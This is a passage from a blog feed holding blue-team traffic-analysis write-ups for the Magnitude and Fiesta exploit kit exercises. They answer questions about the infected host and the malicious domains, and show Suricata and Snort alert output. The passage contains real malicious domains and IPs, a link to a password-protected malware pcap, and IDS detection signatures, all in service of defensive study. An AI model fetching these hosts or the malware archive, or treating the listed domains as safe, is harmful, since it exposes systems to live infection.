+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;rationale&quot;&gt;&lt;strong&gt;Rationale&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;[1]. &lt;strong&gt;What is the date and time of the activity?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2015-01-04 15:27:20&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/1.png&quot; title=&quot;magnitude/1.png&quot; alt=&quot;magnitude/1.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;[2]. &lt;strong&gt;What is the IP address of the Windows host that gets infected?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.204.137&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/2.png&quot; title=&quot;magnitude/2.png&quot; alt=&quot;magnitude/2.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;[3]. &lt;strong&gt;What is the domain name and IP address of the compromised web site?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Domain name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;freeforsgames.com&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;IP Address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;188.227.165.20&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/3.png&quot; title=&quot;magnitude/3.png&quot; alt=&quot;magnitude/3.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;It redirects the victim to the EK site.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/4.png&quot; title=&quot;magnitude/4.png&quot; alt=&quot;magnitude/4.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;[4]. &lt;strong&gt;What is the domain name and IP address that delivered the exploit kit (EK)?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Domain name:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;20.c368.464.75b43b.e3161.dec8.033da1.8c.hl39dj2plwle.lowamounts.in&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;IP Address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5.196.214.27&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;This is an EK website due to a chain of infections happening here. Also this website delivered a large size of payload.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/5.png&quot; title=&quot;magnitude/5.png&quot; alt=&quot;magnitude/5.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Inspecting the payload, we can see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; header is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;html&lt;/code&gt;, but the body is Windows’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.exe&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/magnitude/6.png&quot; title=&quot;magnitude/6.png&quot; alt=&quot;magnitude/6.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;[5]. &lt;strong&gt;What is the name of the EK?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Magnitude EK&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h5 id=&quot;analyse-the-traffic-with-suricata&quot;&gt;Analyse the traffic with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Suricata&lt;/code&gt;&lt;/h5&gt;
+&lt;ul&gt;
+  &lt;li&gt;On the terminal, we execute the following command:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;suricata &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; suricata2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/suricata/suricata.yaml &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 2.pcap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;                          
+25/9/2021 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; 19:02:02 - &amp;lt;Notice&amp;gt; - This is Suricata version 6.0.3 RELEASE running &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;USER mode
+25/9/2021 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; 19:02:02 - &amp;lt;Info&amp;gt; - CPUs/cores online: 4
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Inspecting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fast.log&lt;/code&gt; file, we detect a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Network Trojan&lt;/code&gt; claimed by multiple rules.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-10&lt;/span&gt; suricata2/fast.log
+01/14/2015-10:27:28.580695  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2009897:17] ET MALWARE Possible Windows executable sent when remote host claims to send html content &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49286
+01/14/2015-10:27:34.974606  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2020105:3] ET POLICY Possible IP Check ip-addr.es &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.204.137:49296 -&amp;gt; 188.165.164.184:80
+01/14/2015-10:27:28.843465  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018959:4] ET POLICY PE EXE or DLL Windows file download HTTP &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49286
+01/14/2015-10:27:28.843465  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2016538:3] ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potentially Bad Traffic] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 2] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49286
+01/14/2015-10:27:28.843465  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2021076:2] ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potentially Bad Traffic] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 2] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49286
+01/14/2015-10:27:36.757315  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014726:127] ET POLICY Outdated Flash Version M1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.204.137:49301 -&amp;gt; 5.196.214.27:80
+01/14/2015-10:27:36.757746  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2031747:1] ET HUNTING Observed Interesting Content-Type Inbound &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;application/x-sh&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49301
+01/14/2015-10:27:30.413374  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2009897:17] ET MALWARE Possible Windows executable sent when remote host claims to send html content &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49288
+01/14/2015-10:27:30.674478  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018959:4] ET POLICY PE EXE or DLL Windows file download HTTP &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49288
+01/14/2015-10:27:30.674478  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2016538:3] ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potentially Bad Traffic] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 2] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 5.196.214.27:80 -&amp;gt; 192.168.204.137:49288
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;analyse-the-traffic-with-snort&quot;&gt;Analyse the traffic with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Snort&lt;/code&gt;&lt;/h5&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/securityonion-eth0/snort.conf &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 2.pcap &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console
+01/14-15:27:21.493706  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014726:98] ET POLICY Outdated Flash Version M1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.204.137:49281 -&amp;gt; 5.196.214.27:80
+01/14-15:27:21.493706  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2020895:5] ET CURRENT_EVENTS Magnitude Flash Exploit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; M2 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.204.137:49281 -&amp;gt; 5.196.214.27:80
+01/14-15:27:21.493706  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2019799:2] ET CURRENT_EVENTS Magnitude Flash Exploit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.204.137:49281 -&amp;gt; 5.196.214.27:80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="ek" /><category term="blueteam" /><summary type="html">Description Analyze the following packet and answer the questions.</summary></entry><entry><title type="html">Fiesta EK - Traffic Monitoring with Suricata</title><link href="https://jayngng.github.io/blog/fiesta-ek-traffic-monitoring-with-suricata/" rel="alternate" type="text/html" title="Fiesta EK - Traffic Monitoring with Suricata" /><published>2021-09-25T23:27:03+10:00</published><updated>2021-09-25T23:27:03+10:00</updated><id>https://jayngng.github.io/blog/fiesta-ek---traffic-monitoring-with-suricata</id><content type="html" xml:base="https://jayngng.github.io/blog/fiesta-ek-traffic-monitoring-with-suricata/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;Analyze the following packet and answer the questions.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Link to download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt;: &lt;a href=&quot;https://www.malware-traffic-analysis.net/2015/01/18/2015-01-18-traffic-analysis-exercise-1-of-2.pcap.zip&quot;&gt;here&lt;/a&gt;.
+(Password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infected&lt;/code&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Credit&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware-traffic-analysis.net&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;question&quot;&gt;&lt;strong&gt;Question&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;For each pcap, answer the following questions:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;1) What is the date and time of the activity? &lt;br /&gt;
+2) What is the IP address of the Windows host that gets infected?&lt;br /&gt;
+3) What is the domain name and IP address of the compromised web site?&lt;br /&gt;
+4) What is the domain name and IP address that delivered the exploit kit (EK)?&lt;br /&gt;
+5) What is the name of the EK?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;answer--rationale&quot;&gt;&lt;strong&gt;Answer &amp;amp; Rationale&lt;/strong&gt;&lt;/h2&gt;
+&lt;h5 id=&quot;1-what-is-the-date-and-time-of-the-activity&quot;&gt;&lt;strong&gt;[1]. What is the date and time of the activity?&lt;/strong&gt;&lt;/h5&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2015-01-08 23:51:21&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/1.png&quot; title=&quot;fiesta/1.png&quot; alt=&quot;fiesta/1.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;h5 id=&quot;2-what-is-the-ip-address-of-the-windows-host-that-gets-infected&quot;&gt;&lt;strong&gt;[2]. What is the IP address of the Windows host that gets infected?&lt;/strong&gt;&lt;/h5&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.138.158&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/2.png&quot; title=&quot;fiesta/2.png&quot; alt=&quot;fiesta/2.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;h5 id=&quot;3-what-is-the-domain-name-and-ip-address-of-the-compromised-web-site&quot;&gt;&lt;strong&gt;[3]. What is the domain name and IP address of the compromised web site?&lt;/strong&gt;&lt;/h5&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Domain name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.subaruoutback.org&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;IP Address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;108.168.211.93&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/3.png&quot; title=&quot;fiesta/3.png&quot; alt=&quot;fiesta/3.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;h5 id=&quot;4-what-is-the-domain-name-and-ip-address-that-delivered-the-exploit-kit-ek&quot;&gt;&lt;strong&gt;[4]. What is the domain name and IP address that delivered the exploit kit (EK)?&lt;/strong&gt;&lt;/h5&gt;
+&lt;ul&gt;
+  &lt;li&gt;Domain name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atypefresh.in&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;IP address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;205.234.186.112&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h5 id=&quot;5-what-is-the-ek-name&quot;&gt;&lt;strong&gt;[5]. What is the EK name?&lt;/strong&gt;&lt;/h5&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fiesta&lt;/code&gt; EK.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;snort&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Snort&lt;/code&gt;&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Within the Security Onion.&lt;/li&gt;
+  &lt;li&gt;From the first terminal, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpreplay&lt;/code&gt; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.pcap&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpreplay &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 1.pcap 
+sending out eth0 
+processing file: 1.pcap
+Actual: 4804 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4899622 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.31 seconds.              Rated: 15805232.0 bps, 120.58 Mbps, 15496.77 pps
+Statistics &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;network device: eth0
+        Attempted packets:         4804
+        Successful packets:        4804
+        Failed packets:            0
+        Retried packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ENOBUFS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 0
+        Retried packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EAGAIN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:  0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Within the second terminal, we execute the following command and observe that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt; rule is triggered.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/securityonion-eth0/snort.conf &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 
+09/25-02:51:27.566318  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2019655:5] ET CURRENT_EVENTS Fiesta EK Landing Nov 05 2014 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 205.234.186.112:80 -&amp;gt; 192.168.138.158:51629
